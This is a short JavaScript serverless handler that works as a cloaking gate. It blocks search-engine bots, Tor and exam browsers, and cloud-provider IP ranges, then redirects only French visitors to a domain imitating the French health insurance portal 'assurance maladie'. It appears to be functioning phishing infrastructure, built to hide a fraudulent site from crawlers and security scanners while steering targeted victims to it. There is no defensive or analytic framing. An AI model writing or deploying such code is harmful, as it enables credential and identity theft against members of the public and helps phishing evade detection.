import fetch from 'node-fetch';
import checkIp from 'ip-range-check';

export default async function handler(req, res) {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const botSignatures = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot'];
  if (botSignatures.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()))) {
    res.status(403).send('Access blocked for bots.');
    return;
  }
  const blockedBrowsers = ['SafeExamBrowser', 'TorBrowser'];
  if (blockedBrowsers.some(browser => userAgent.toLowerCase().includes(browser.toLowerCase()))) {
    res.status(403).send('Access blocked for this browser.');
    return;
  }
  try {
    const awsResponse = await fetch('https://ip-ranges.amazonaws.com/ip-ranges.json');
    const awsData = await awsResponse.json();
    const awsRanges = awsData.prefixes.map(prefix => prefix.ip_prefix);
    const googleRanges = ['35.190.0.0/16', '104.196.0.0/14'];
    const azureRanges = ['20.36.0.0/14', '40.90.0.0/15'];
    const blockedRanges = [...awsRanges, ...googleRanges, ...azureRanges];
    if (blockedRanges.some(range => checkIp(clientIp, range))) {
      res.status(403).send('Access blocked for cloud provider IPs.');
      return;
    }
    const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
    const geoData = await geoResponse.json();
    if (geoData.status === 'success' && geoData.countryCode === 'FR') {
      res.redirect(301, 'https://mon-espace-assurance-maladie-assure.vercel.app/');
    } else {
      res.status(403).send('Access restricted to France-based IPs only.');
    }
  } catch (error) {
    console.error('Error in IP validation:', error);
    res.status(500).send('Internal server error.');
  }
}
